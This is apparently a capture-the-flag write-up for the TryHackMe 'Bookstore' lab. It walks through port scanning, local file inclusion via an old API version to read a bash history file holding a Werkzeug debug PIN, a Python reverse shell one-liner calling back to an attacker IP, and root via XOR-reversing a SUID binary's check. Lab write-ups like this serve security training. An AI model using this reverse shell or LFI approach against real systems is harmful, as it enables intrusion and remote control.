# TryHackMe-Bookstore

## NMAP

```
Nmap scan report for 10.10.117.123
Host is up (0.15s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 44:0e:60:ab:1e:86:5b:44:28:51:db:3f:9b:12:21:77 (RSA)
|   256 59:2f:70:76:9f:65:ab:dc:0c:7d:c1:a2:a3:4d:e6:40 (ECDSA)
|_  256 10:9f:0b:dd:d6:4d:c7:7a:3d:ff:52:42:1d:29:6e:ba (ED25519)
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Book Store
5000/tcp open  http    Werkzeug httpd 0.14.1 (Python 3.6.9)
| http-robots.txt: 1 disallowed entry 
|_/api </p> 
|_http-title: Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1323.85 seconds

```

## PORT 80

<img src="https://imgur.com/TTzO2wr.png"/>

## PORT 5000

<img src="https://imgur.com/NDu92Ye.png"/>

As we saw from nmap scan that there is a `robots.txt` file at port 5000

<img src="https://imgur.com/dI8y0tJ.png"/>

<img src="https://imgur.com/4X8nlfw.png"/>

Running gobuster on this port we see a console a type of debugger

<img src="https://imgur.com/JhylVwm.png"/>

<img src="https://imgur.com/DRbVY4g.png"/>

But it's asking for a PIN.

I found a metasploit exploit for it but it didn't worked

<img src="https://imgur.com/oGgxBQO.png"/>

Going back to port 80 and then looking at the login page source we find that PIN is in bash history file of user `sid`.

We know there are two versions of api v1 and v2 , v1 is likely to be vulnerable to LFI so let's choose the endpoint that has a parameter

`/api/v2/resources/books?id=1`

Change this to 

`/api/v1/resources/books?id=.bash_history`

then put it in `wfuzz`

### Wfuzz

```
wfuzz -u http://10.10.117.123:5000/api/v1/resources/books\?FUZZ\=.bash_history -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404
```

Here 

`-u`    the host with the api-endpoint
`?FUZZ` here ? is before the paramter and "FUZZ" is the location where we want to find the paramter
`--hc`  is telling to hide status codes like 404 which is not found

<img src="https://imgur.com/xh9A7H1.png"/>

<img src="https://imgur.com/TJWxLdg.png"/>

```
cd /home/sid whoami export WERKZEUG_DEBUG_PIN=123-321-135 echo $WERKZEUG_DEBUG_PIN python3 /home/sid/api.py ls exit 
```

<img src="https://imgur.com/AB6oKEG.png"/>

And now we can interact with the debugger also in order to get into the box we have to paste a reverse shell there

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.209.100",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);

```
Paste this on to the debugger and set your netcat listener

<img src="https://imgur.com/sbTCu2l.png"/>


## Privlege Escalation


<img src="https://imgur.com/VZSpKHD.png"/>

We see a binary which has a SUID on it so it can run as a root but we need to figure out what it is doing and how we can execute it properly to get root


On analyzing the binary with `ghidra`

<img src="https://imgur.com/F16KKwC.png"/>

?    ----> local_1c is the number we are going to input
4374 ---->
23987 ---> local_18

local_14 has to be this number 1573724660

I have converted those hexadecimal number to decimal to get a better understanding


`local_14 = local_1c ^ 4374 ^ local_18`


What's happening in here is that these three values are getting through and exclusive OR operator `^` .We don't know what value we put inorder to get `1573724660`.

So I'll convert hex values to decimal and XOR between them

```
1573724660 ^ 4374 ^ local_18

1573724660 ^ 4374 ^ 23987

1573724660 ^ 19621

1573743953

```
<img src="https://imgur.com/Bk3Svt9.png"/>

Let's try the final result we got

<img src="https://imgur.com/8AdgZpm.png"/>

And we are root !